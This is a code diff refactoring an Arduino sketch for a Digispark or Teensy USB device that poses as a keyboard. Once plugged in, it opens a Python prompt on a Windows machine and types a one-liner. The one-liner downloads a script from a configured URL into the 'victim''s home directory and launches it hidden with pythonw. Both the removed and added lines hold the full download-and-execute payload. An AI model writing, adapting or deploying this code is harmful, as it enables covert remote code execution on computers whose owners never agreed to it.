@@ -29,84 +29,71 @@ SOFTWARE.
 #define PY_SCRIPT_NAME "pyscr.py" // Name of script that is saved on "victim"'s user directory
 
 //#define TEENSY // Uncomment if programming a teensy
-#define UK_KEYBOARD // Change to US_KEYBOARD if using a computer in the US
 
 #define START_DELAY 1200
 #define START_MENU_DELAY 600
-#define START_MENU_SEARCH_DELAY 100
-#define PYTHON_WINDOW_OPEN_DELAY 300
+#define START_MENU_SEARCH_DELAY 150
+#define PYTHON_WINDOW_OPEN_DELAY 600
 
-#ifdef TEENSY
-  #define US_KEYBOARD
-#else
+#ifndef TEENSY
   #include "DigiKeyboard.h"
 #endif
 
-
-void print(char* str) {
-  //print on both teensy and dspark
-  #ifdef TEENSY
-    Keyboard.print(str);
-  #else
-    DigiKeyboard.print(str);
-  #endif
-}
-void wait(int t) {
-  //delay on both teensy and dspark
-  #ifdef TEENSY
-    delay(t);
-  #else
-    DigiKeyboard.delay(t);
-  #endif
-}
-void winKey() {
-  //windows key on both teensy and dspark
-  #ifdef TEENSY
-    Keyboard.press(KEY_LEFT_GUI);
-    Keyboard.release(KEY_LEFT_GUI);
-  #else
-    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
-  #endif
-}
-void enter() {
-  //windows key on both teensy and dspark
-  #ifdef TEENSY
-    Keyboard.press(KEY_ENTER);
-    Keyboard.release(KEY_ENTER);
-  #else
-    DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
-  #endif
+namespace kbd {
+  void print(char* str) {
+    //print on both teensy and dspark
+    #ifdef TEENSY
+      Keyboard.print(str);
+    #else
+      DigiKeyboard.print(str);
+    #endif
+  }
+  void wait(int t) {
+    //delay on both teensy and dspark
+    #ifdef TEENSY
+      delay(t);
+    #else
+      DigiKeyboard.delay(t);
+    #endif
+  }
+  void pressKey(int key) {
+    #ifdef TEENSY
+      Keyboard.press(key);
+      Keyboard.release(key);
+    #else
+      DigiKeyboard.sendKeyStroke(0, key);
+    #endif
+  }
+  void enter() {
+    //windows key on both teensy and dspark
+    #ifdef TEENSY
+      Keyboard.press(KEY_ENTER);
+      Keyboard.release(KEY_ENTER);
+    #else
+      DigiKeyboard.sendKeyStroke(0, KEY_ENTER);
+    #endif
+  }
 }
 
 
 
 void setup() {
   /*   Open python prompt   */
-  wait(START_DELAY);
-  winKey();
-  wait(START_MENU_DELAY);
-  print("python.exe");
-  wait(START_MENU_SEARCH_DELAY);
-  enter();
-  wait(PYTHON_WINDOW_OPEN_DELAY);
+  kbd::wait(START_DELAY);
+  kbd::pressKey(KEY_LEFT_GUI);
+  kbd::wait(START_MENU_DELAY);
+  kbd::print("python.exe");
+  kbd::wait(START_MENU_SEARCH_DELAY);
+  kbd::pressKey(KEY_ENTER);
+  kbd::wait(PYTHON_WINDOW_OPEN_DELAY);
 
   
   /*   Python script   */
-  // All is in one line but split into multiple prints for readability
-  print("import subprocess,os,urllib.request as r;");
-  // Change directory to home as we may not have permission to edit in the python folder
-  #ifdef US_KEYBOARD
-    print("os.chdir(os.path.expanduser('~'));");
-  #elif Uk_KEYBOARD
-    print("os.chdir(os.path.expanduser('|'));");
-  #endif
-  // Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
-  print("f=open('");print(PY_SCRIPT_NAME);print("','wb');");
-  print("f.write(r.urlopen('");print(PY_SCRIPT_URL);print("').read());");
-  print("f.close();");
-  // Open the script we just made with pythonw (so it runs in background)
-  print("subprocess.Popen('pythonw.exe ");print(PY_SCRIPT_NAME);print("',creationflags=8,close_fds=True);");
-  // Close python prompt when done
-  print("exit();");
-  enter();
+  kbd::print({"import subprocess,os,urllib.request as r;" // imports
+         "os.chdir(os.path.expanduser('~'));"// Change directory to home as we may not have permission to edit in the python folder Change ~ with | if on uk keyboard with digispark
+         "f=open('"});kbd::print(PY_SCRIPT_NAME);kbd::print({"','wb');"// Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
+         "f.write(r.urlopen('"});kbd::print(PY_SCRIPT_URL);kbd::print({"').read());"
+         "f.close();"
+         "subprocess.Popen('pythonw.exe "});kbd::print(PY_SCRIPT_NAME);kbd::print({"',creationflags=8,close_fds=True);"}); // Open the script we just made with pythonw (so it runs in background)
+  kbd::pressKey(KEY_ENTER);
 }void loop() {}
